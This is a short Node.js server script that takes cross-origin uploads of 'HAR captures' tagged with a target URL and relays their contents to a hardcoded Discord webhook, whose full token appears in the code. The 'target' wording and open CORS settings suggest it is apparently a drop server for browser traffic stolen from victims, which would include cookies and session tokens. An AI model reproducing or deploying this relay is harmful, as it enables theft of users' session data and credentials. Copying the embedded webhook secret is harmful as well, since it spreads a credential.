const http = require('http');
const https = require('https');
const url = require('url');

const PORT = process.env.PORT || 8080;
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518170938976374944/siOdKNiCert2ug7RW9oSFGiM-1EW1aMJNekRtVjRMHu3hoIRVCMLSt0fxeMUY6-LVMbd"; // paste full URL

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-HAR-Timestamp, X-Target-URL');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }
    
    if (req.method === 'GET' && req.url === '/') {
        res.writeHead(200, {'Content-Type': 'text/plain'});
        res.end('Online');
        return;
    }
    
    if (req.method === 'POST' && req.url === '/upload_har') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const targetUrl = req.headers['x-target-url'] || 'unknown';
            // Forward to Discord
            const discordPayload = JSON.stringify({
                content: `New HAR capture from ${targetUrl}`,
                embeds: [{
                    title: "HAR Capture",
                    fields: [
                        { name: "Target", value: targetUrl },
                        { name: "Data", value: body.substring(0, 1024) || "empty" }
                    ]
                }]
            });
            
            const webhookUrl = url.parse(DISCORD_WEBHOOK);
            const discordReq = https.request({
                hostname: webhookUrl.hostname,
                path: webhookUrl.path,
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            });
            discordReq.write(discordPayload);
            discordReq.end();
            
            res.writeHead(200, {'Content-Type': 'application/json'});
            res.end(JSON.stringify({success: true}));
        });
        return;
    }
    
    res.writeHead(404);
    res.end();
});

server.listen(PORT, () => console.log('Server running'));
